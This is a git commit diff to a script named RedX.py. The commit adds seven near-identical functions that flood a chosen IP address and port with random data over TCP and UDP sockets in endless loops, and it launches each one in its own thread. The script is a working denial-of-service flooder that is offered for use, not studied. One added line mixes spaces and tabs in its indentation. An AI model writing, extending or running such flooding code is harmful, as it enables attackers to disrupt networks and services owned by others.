55feb4db0e34cb07bd302be3c9d226b48eb6ab3c
Cryspot <94024627+Cryspot@users.noreply.github.com>
2021-12-06 13:20:44 +0700

    Update RedX.py

--- RedX.py
+++ RedX.py
@@ -67,6 +67,102 @@ def run3():
 			s.close()
 			print("\033[94m[*TOK*TOK*] PERMISI PAKET DATENG ")
 
+def run4():
+	data = random._urandom(1180)
+	i = random.choice(("","",""))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			s.connect((ip,port))
+			s.send(data)
+			for x in range(times):
+				s.send(data)
+			print("packet to %s throught port:%s"%(ip,port))
+		except:
+			s.close()
+
+def run5():
+	data = random._urandom(1024)
+	i = random.choice(("","",""))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			s.connect((ip,port))
+			s.send(data)
+			for x in range(times):
+				s.send(data)
+			print("packet to %s throught port:%s"%(ip,port))
+		except:
+			s.close()
+
+def run6():
+	data = random._urandom(1180)
+	i = random.choice(("","",""))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			s.connect((ip,port))
+			s.send(data)
+			for x in range(times):
+				s.send(data)
+			print("packet to %s throught port:%s"%(ip,port))
+		except:
+			s.close()
+
+def run7():
+	data = random._urandom(1024)
+	i = random.choice(("","",""))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			addr = (str(ip),int(port))
+			for x in range(times):
+				s.sendto(data,addr)
+			print("packet to %s throught port:%s"%(ip,port))
+		except:
+			s.close()
+
+def run8():
+	data = random._urandom(1180)
+	i = random.choice(("","",""))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			s.connect((ip,port))
+			s.send(data)
+			for x in range(times):
+				s.send(data)
+			print("packet to %s throught port:%s"%(ip,port))
+		except:
+			s.close()
+
+def run9():
+	data = random._urandom(1024)
+	i = random.choice(("","",""))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			s.connect((ip,port))
+			s.send(data)
+			for x in range(times):
+				s.send(data)
+			print("packet to %s throught port:%s"%(ip,port))
+		except:
+			s.close()
+
+def run10():
+	data = random._urandom(1180)
+	i = random.choice(("","",""))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			s.connect((ip,port))
+			s.send(data)
+			for x in range(times):
+				s.send(data)
+			print("packet to %s throught port:%s"%(ip,port))
+		except:
+			s.close()
 for y in range(threads):
 	if choice == 'y':
 		th = threading.Thread(target = run)
@@ -74,4 +170,18 @@ for y in range(threads):
 		th = threading.Thread(target = run2)
 		th.start()
 		th = threading.Thread(target = run3)
+		th.start()
+                th = threading.Thread(target = run4)
+		th.start()
+		th = threading.Thread(target = run5)
+		th.start()
+		th = threading.Thread(target = run6)
+		th.start()
+		th = threading.Thread(target = run7)
+		th.start()
+		th = threading.Thread(target = run8)
+		th.start()
+		th = threading.Thread(target = run9)
+		th.start()
+		th = threading.Thread(target = run10)
 		th.start()
